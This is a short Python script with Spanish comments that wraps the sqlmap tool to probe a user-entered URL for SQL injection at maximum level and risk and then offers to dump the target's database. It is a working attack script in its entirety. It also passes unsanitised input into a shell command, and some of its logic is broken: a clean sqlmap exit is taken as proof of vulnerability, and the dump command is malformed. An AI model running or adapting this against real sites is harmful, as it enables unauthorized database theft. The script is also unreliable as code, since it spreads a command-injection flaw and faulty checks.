import requests
import subprocess

def comprueba_sql_injection(base_url):
    url = f"{base_url}?id=1" # Le añade un parametro para poder ejecutar sqlmap
    # Comando SQLMap para comprobar vulnerabilidades SQL-I
    command = f"sqlmap -u {url} --batch --level=5 --risk=3 --technique=BEU"
    
    print("\n////////////////////////EMPIEZA SQLMAP////////////////////////")
    try:
        # Ejecutar el comando
        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True, check=True) # Ejecuta el comando a la url

        print(result.stdout) # Imprime los resultados de sqlmap
        print("////////////////////////TERMINA SQLMAP////////////////////////")
        print("\nLa página web es vulnerable a inyeccion SQL\n")
        
        comprobar = input("Deseas obtener informacion de la base de datos? [Y/N] ") # Si es vulnerable es posible acceder con sqlmap

        if(comprobar == 'Y'):
            obtain_DB_info(url) # Llamada a la funcion
        else:
            print("Saliendo...") # Terminar el proceso

    except subprocess.CalledProcessError as e:
        print("La pagina web no es vulnerable a inyección SQL\nSaliendo...\n")
        print(f"Error: {e}")
        print(e.stderr)



def obtain_DB_info(url):  
    # Comando SQLMap para obtener info de la bd  
    print("\n////////////////////////EMPIEZA SQLMAP////////////////////////")
    command = f"sqlmap {url} -D db –dump --batch"

    # Ejecutar el comando  
    subprocess.run(command, shell=True)
    print("////////////////////////TERMINA SQLMAP////////////////////////")

# Ejemplo de uso
if __name__ == "__main__":

    # Ingresa la URL y el parámetro vulnerable como argumentos al ejecutar el script
    base_url = input("Ingresa la URL de la página web: ")    
    comprueba_sql_injection(base_url) # Llamada a la funcion 